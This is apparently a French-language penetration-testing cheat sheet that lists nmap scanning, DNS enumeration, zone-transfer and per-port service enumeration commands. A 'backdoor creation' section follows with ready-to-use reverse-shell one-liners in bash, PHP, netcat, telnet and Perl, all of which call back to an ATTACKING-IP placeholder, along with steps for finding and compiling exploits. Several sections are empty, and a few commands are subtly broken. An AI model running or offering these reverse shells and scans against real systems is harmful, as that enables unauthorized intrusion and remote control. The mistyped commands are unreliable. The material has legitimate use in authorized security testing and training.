
# Checklist PENTEST

 ## Pré-requis
 - metre a jour la base de donnée d''exploit
 
```bash
cd /pentest/exploits/exploitdb/
svn update
msfupdate
```

 ## Découverte des machines sur le réseau

 ```bash
nmap -sn -n -oG IP_alive_nmap.txt <Net-CIDR>
cat IP_alive_nmap.txt | grep "Status: Up" |cut -d" " -f2 > IPs_alive_nmap.txt
 ```
 
 ## Découverte des machine avec le DNS
#### DNS Discover
- Découverte des servers DNS disponible
```bash
dns_discovery.sh / "dns_discovery_FILE_perl.pl IPs_Alive_Ping.txt"
```     
- Découverte des sous-domain

```bash
set /etc/resolv.conf and test with "dnsenum.pl --enum"
```
- Découverte des nom de machines
1. Reverse DNS brute force
```bash
reverse_dns_enumeration.sh / "dnsenum.pl --enum"
```
2. Transfert de zone DNS
```bash
dnsenum.pl --enum -f <DNS_brute_names_file> --dnsserver <dns_server_ip> <domain_name>
nslookup -> set type=any -> ls -d pwned.com
dig axfr blah.com @ns1.pwned.com
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```


 ## SCAN
 ```bash
netdiscover -r 192.168.1.0/24
 
 Always start with a stealthy scan to avoid closing ports.
# Syn-scan
nmap -sS INSERT_IP_ADDRESS

# Service-version, default scripts, OS:
nmap INSERT_IP_ADDRESS -sV -sC -O

# Scan all ports, might take a while.
nmap INSERT_IP_ADDRESS -p-

# Scan for UDP
nmap INSERT_IP_ADDRESS -sU
unicornscan -mU -v -I INSERT_IP_ADDRESS

# Connect to udp if one is open
nc -u INSERT_IP_ADDRESS 48772

# Monster scan
nmap INSERT_IP_ADDRESS -p- -A -T4 -sC

#Verbose, syn, all ports, all scripts, no ping
nmap -vv -Pn -A -sC -sS -T 4 -p- INSERT_IP_ADDRESS

#Verbose, SYN Stealth, Version info, and scripts against services.
nmap -v -sS -A -T4 INSERT_IP_ADDRESS

#Nmap script to scan for vulnerable SMB servers – WARNING: unsafe=1 may cause knockover
nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 INSERT_IP_ADDRESS
 ```
 
 ## ENUMERATION
 
 #### Port 21 FTP
 
 ```bash
  nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERT_IP_ADDRESS
 ```

  #### Port 25  smtp
 
 ```bash
nc -nvv INSERT_IP_ADDRESS 25
HELO foo<cr><lf>

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERT_IP_ADDRESS

telnet INSERT_IP_ADDRESS 25
 ```
  #### Port 110  pop3
 
 ```bash

 ```
 
  #### Port 113 MSRPC
 
 ```bash
nmap INSERTIPADDRESS --script=msrpc-enum
 ```
 
 
  #### Port 139/445 SMB
 
 ```bash
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERT_IP_ADDRESS -p 445

enum4linux -a INSERT_IP_ADDRESS

rpcclient -U "" INSERT_IP_ADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john

Log in with shell:
winexe -U username //INSERTIPADDRESS "cmd.exe" --system


nbtscan x.x.x.x
 ```
  #### Port 161/162 SNMP
>   \#Common community strings
public
private
community
 ```bash
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
 ```
 
  #### Port 554 RTSP
 
 ```bash

 ```
 
  #### Port 1030/1032/1033/1038
 
 ```bash

 ```
 
  #### Port 1433 MSSQL
 
 ```bash

 ```
  #### Port 1521 Oracle
 
 ```bash
tnscmd10g version -h INSERT_IP_ADDRESS
tnscmd10g status -h INSERT_IP_ADDRESS
 ```
  #### Port 2100 - Oracle XML DB
 ```bash

 ```
 
  #### Port 2049 -NFS
 ```bash

 ```
 
  #### Port 3306 MySQL
 ```bash
nmap -sV -Pn -vv  INSERT_IP_ADDRESS -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
 ```
 
  #### Port 3389 RDP
 ```bash

 ```
 
  #### Port 80 HTTP
 ```bash
dirb http://INSERT_IP_ADDRESS/
nikto –h INSERT_IP_ADDRESS
 ```
 
  #### Port 443 HTTPS
  > Heartbleed
 ```bash
sslscan INSERT_IP_ADDRESS:443
 ```
 

 
 
 ## Navigation HTTP & FTP
 ## Création de backdoor
 
 > Ecouté sur le un port ( utilisé un port ouvert par defaut comme 80, 443 ou 53( ici 80 )
 ```bash 
 nc -nvlp 80
 nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
 ```
 #### Bash Reverse Shells
  ```bash
  exec /bin/bash 0&0 2>&0
  
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1

  ```
 
 #### PHP Reverse Shell
 
```bash
hp -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```
---
 Link : PentestMonkey
 
 ---
 #### Netcat Reverse Shell
 ```bash
 nc -e /bin/sh ATTACKING-IP 80
 
/bin/sh | nc ATTACKING-IP 80

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
 #### Telnet Reverse Shell
 
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
# Ecouté aussi sur le port 443 aussi
 ```
 
 #### Perl Reverse Shell
 
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 #### Perl Windows Reverse Shell
 
 ```bash
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 ## Exploit Research
 ```bash
searchsploit windows 2003 | grep -i local 
```
### Compiling exploits for Linux/Windows
```bash
#Compile C code, add –m32 after ‘gcc’ for compiling 32 bit code on 64 bit Linux
gcc -o exploit exploit.c

Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```


## Packet Inspection 
```
#tcpdump du port 80 sur l'interface eth0, dans le fichier output.pcap
tcpdump tcp port 80 -w output.pcap -i eth0
```
 ## Port tunelling / Redirection
 ## Firewall Evasion
 ## Privilege escalation
 #### Windows 
 ---
    Link :
 ---
 
 
 